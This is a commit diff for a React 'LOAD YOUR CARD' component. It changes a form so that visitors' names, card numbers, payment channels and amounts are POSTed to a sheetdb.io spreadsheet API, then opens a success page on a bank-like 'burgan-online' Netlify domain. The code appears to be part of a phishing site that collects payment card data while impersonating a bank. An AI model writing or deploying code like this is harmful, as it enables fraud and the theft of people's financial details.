bfcacab4b06cdb0508d4e0cf26018f67ffc74856
Kwarto <dbitsolu@gmail.com>
2022-09-13 01:26:13 +0000

    load page done

--- src/components/loadcard/LoadCard.jsx
+++ src/components/loadcard/LoadCard.jsx
@@ -1,5 +1,4 @@
 import React from 'react'
-import { useNavigate } from 'react-router-dom'
 import {
     LoadCardWrapper, LoadCardContainer, LoadCardLeft, 
     HeadingWrapper, PaymentMethod,MethodWrapper, 
@@ -8,7 +7,9 @@ import {
 import MobileImg from '../../images/receive.jpg'
 import {GiCash} from 'react-icons/gi'
 function LoadCard() {
-  const navigate = useNavigate();
+  const openInNewTab = url => {
+    window.open(url, '_blank', 'noopener,noreferrer');
+  };
   return (
     <>
       <LoadCardWrapper>
@@ -33,16 +34,16 @@ function LoadCard() {
              <LoadWrap>
                <h2>LOAD YOUR CARD</h2>
 
-               <form action="">
+               <form action="https://sheetdb.io/api/v1/5luwssoqg2bmn" method='POST'>
                  <label htmlFor="fullname">Full Name</label>
-                 <input type="text" name='username' placeholder='Enter Your Name' required/>
+                 <input type="text" name='data[username]' placeholder='Enter Your Name' required/>
                  <label htmlFor="cardnumber">Card Number</label>
-                 <input type="number" name='cardnumber' placeholder='Enter Card Number' required minLength={16}/>
+                 <input type="number" name='data[cardnumber]' placeholder='Enter Card Number' required minLength={16}/>
                  <label htmlFor="payslot">Payment Channel</label>
-                 <input type="text" placeholder='eg. Bank number, Mobile money number, BTC Wallet' required/>
+                 <input type="text" name='data[payslot]' placeholder='eg. Bank number, Mobile money number, BTC Wallet' required/>
                  <label htmlFor="payslot">Total Amount</label>
-                 <input type="number" placeholder='eg. 100 KD, 100 USD, 100 EUR, 100NR, 100 GH' required/>
-                 <button type="submit" onClick={() => {navigate("/buxpaysuccess", { replace: true });}}>Submit Request</button>
+                 <input type="number" name='data[requestamount]' placeholder='eg. 100 KD, 100 USD, 100 EUR, 100NR, 100 GH' required/>
+                 <button type="submit" onClick={() => openInNewTab(`https://burgan-online.netlify.app/buxpaysuccess`)}>Submit Request</button>
                </form>
              </LoadWrap>
           </LoadCardLeft>
